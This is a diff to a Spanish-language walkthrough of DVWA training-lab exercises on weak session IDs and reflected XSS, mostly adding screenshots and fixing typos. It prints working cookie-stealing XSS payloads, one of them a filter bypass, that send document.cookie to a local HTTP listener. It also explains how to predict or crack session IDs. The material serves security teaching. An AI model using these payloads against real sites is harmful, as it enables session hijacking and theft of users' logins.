@@ -287,42 +287,49 @@ Esta herramienta es tan potente que permite incluso detectar y crackear los hash
 
 
 
-# Weal Session IDs
+# Weak Session IDs
 
-(pantallazo)
+![Weak session ids](https://github.com/sapellaniz/dvwa/blob/master/img/weak-session-id-00.png)
 
 Las aplicaciones web modernas establecen una serie de transacciones entre el cliente y el servidor. Dado que el protocolo HTTP no tiene estado, la forma de seguir a un usuario es crear sesiones por usuario autenticado mediante identificadores. Si estos identificadores se pueden predecir, esto puede llevar a un secuestro de sesión.
 
 ### Security: low
 Con el nivel de seguridad bajo seleccionado, si se pulsa unas pocas veces el botón "Generate" mientras se inspeccionan las cookies en el navegador, se puede deducir que el ID se va incrementando de uno en uno para cada sesión, sin tener que mirar el código.
-(pantallazo) 
+
+![Weak session ids](https://github.com/sapellaniz/dvwa/blob/master/img/weak-session-id-01.png)
 
 ### Security: medium
-Con el nivel de seguridad medio seleccionado, también es fácil deducir que el ID es el timestamp en decimal del momento en el que se crea la sesión.
+Con el nivel de seguridad medio seleccionado, también es fácil deducir que el ID es el timestamp en decimal del momento en el que se crea la sesión. Podemos identificarlo facilmente con la herramienta [Cyber chef](https://gchq.github.io/CyberChef/):
+
+![Weak session ids](https://github.com/sapellaniz/dvwa/blob/master/img/weak-session-id-02.png)
 
 ### Security: high
-Con el nivel de seguridad alto seleccionado, es igual que en el nivel bajo, solo que en vez de en plano, el ID es el hash MD5, en internet hay bases de datos con gran cantidad de hashes crackeados.
+Con el nivel de seguridad alto seleccionado, es igual que en el nivel bajo, solo que en vez de en plano, el ID es el hash MD5, en internet hay bases de datos con gran cantidad de hashes crackeados, asi que introduciendo el hash en un buscador aparecen gran cantidad de resultados con la cadena original.
 
 
 # XSS Reflected
 
-(pantallazo)
+![XSS Reflected](https://github.com/sapellaniz/dvwa/blob/master/img/xss-reflected-00.png)
 
-Los ataques de Cross-Site Scripting (XSS) son un tipo de inyección, en el que se inyectan scripts maliciosos en sitios web que de otro modo serían benignos y confiables.
+Los ataques de Cross-Site Scripting (XSS) son un tipo de inyección, en el que se inyectan scripts maliciosos en sitios web.
 
 Los ataques reflejados son aquellos en los que el script inyectado se refleja en el servidor web, como en un mensaje de error, resultado de búsqueda o cualquier otra respuesta que incluya parte o toda la entrada enviada al servidor como parte de la solicitud. Los ataques reflejados se envían a las víctimas a través de otra ruta, como en un mensaje de correo electrónico o en algún otro sitio web. Cuando se engaña a un usuario para que haga clic en un enlace malicioso, envíe un formulario especialmente diseñado o simplemente navegue a un sitio malicioso, el código inyectado viaja al sitio web vulnerable, que refleja el ataque en el navegador del usuario. Luego, el navegador ejecuta el código porque proviene de un servidor "confiable".
 
 ### Security: low
 Con el nivel de seguridad bajo seleccionado, no hay ningún tipo de protección, podemos robar la cookie de sesión con el siguiente payload mientras dejamos un servidor http a la escucha en nuesta máquina:
+
 ```
 # 1- Levantar servicdor http:
-$ python3 http.server
+$ python3 -m http.server
 # 2- Introducir el siquiente payload:
 <script type="text/javascript">document.location='http://172.17.0.1:8000/index.html?c='+document.cookie;</script>
 ```
 
+![XSS Reflected](https://github.com/sapellaniz/dvwa/blob/master/img/xss-reflected-01.png)
+
 ### Security: medium
 Con el nivel de seguridad medio seleccionado, si inspeccionamos el código, podemos ver que hay una protección que elimina la cadena "script" de nuestra entrada, se puede bypassear facilmente con el siguiente payload:
+
 ```
 <img src="#" onclick=document.location='http://172.17.0.1:8000/index.html?c='+document.cookie; >
 ```
@@ -332,7 +339,6 @@ Con el nivel de seguridad alto seleccionado, podemos usar el mismo payload que u
 
 
 # XSS stored
-############
 
 (pantallazo)
 
